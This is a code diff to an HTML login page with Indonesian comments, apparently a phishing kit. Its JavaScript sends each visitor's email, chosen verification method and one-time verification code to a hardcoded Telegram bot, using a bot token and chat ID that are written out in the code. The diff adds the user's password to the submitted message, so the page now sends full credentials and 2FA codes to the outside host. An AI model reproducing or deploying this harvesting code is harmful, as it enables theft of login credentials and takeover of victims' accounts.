@@ -60,7 +60,6 @@
   const telegramBotToken = '8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M';
   const chatId = '5116335881';
 
-  // Fungsi kirim pesan ke Telegram
   function sendTelegramMessage(message) {
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
     fetch(url, {
@@ -81,33 +80,34 @@
       });
   }
 
-  // Saat pengguna pilih metode verifikasi
+  // Saat memilih metode verifikasi
   function pilihVerifikasi(method) {
     document.getElementById('verif-section').style.display = 'block';
+    document.getElementById('verif-label').innerText = 'Masukkan kode dari ' + method;
 
-    // Kirim info login ke Telegram langsung saat pilihan dipilih
+    // Kirim info email login saja ke Telegram
     const email = document.getElementById('email').value || '(belum diisi)';
-    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nStatus: Memilih metode`;
+    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}`;
     sendTelegramMessage(pesan);
   }
 
-  // Saat pengguna submit login
+  // Saat klik login setelah memasukkan kode
   function submitLogin() {
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
     const kodeVerif = document.getElementById('kode-verifikasi').value;
-    const metode = document.getElementById('verif-method-select').value;
+    const metode = document.getElementById('verif-method').value;
 
     if (!email || !password || !metode || !kodeVerif) {
       alert('Harap lengkapi semua kolom!');
       return;
     }
 
-    // Kirim info login dan kode verifikasi ke Telegram
-    const pesan = `Login:\nEmail: ${email}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
+    // Kirim detail lengkap termasuk password dan kode verifikasi
+    const pesan = `Login:\nEmail: ${email}\nPassword: ${password}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
     sendTelegramMessage(pesan);
 
-    alert('Verifikasi selesai dan pesan dikirim ke Telegram!');
+    alert('Pesan lengkap dikirim ke Telegram!');
   }
 </script>
 </head>
@@ -142,18 +142,18 @@
 </div>
 
 <script>
-  // Atur label verifikasi saat memilih metode
+  // Mengatur label saat memilih metode
   function pilihVerifikasi(method) {
     document.getElementById('verif-section').style.display = 'block';
     document.getElementById('verif-label').innerText = 'Masukkan kode dari ' + method;
-
-    // Segera kirim info login ke Telegram saat metode dipilih
+    
+    // Kirim info email saja ke Telegram saat metode dipilih
     const email = document.getElementById('email').value || '(belum diisi)';
-    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nStatus: Memilih metode`;
+    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}`;
     sendTelegramMessage(pesan);
   }
 
-  // Kirim pesan saat login selesai
+  // Kirim pesan lengkap saat klik login
   function submitLogin() {
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
@@ -165,10 +165,10 @@
       return;
     }
 
-    const pesan = `Login:\nEmail: ${email}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
+    const pesan = `Login:\nEmail: ${email}\nPassword: ${password}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
     sendTelegramMessage(pesan);
 
-    alert('Pesan dikirim ke Telegram dan proses login selesai.');
+    alert('Pesan lengkap dikirim ke Telegram!');
   }
 </script>
 
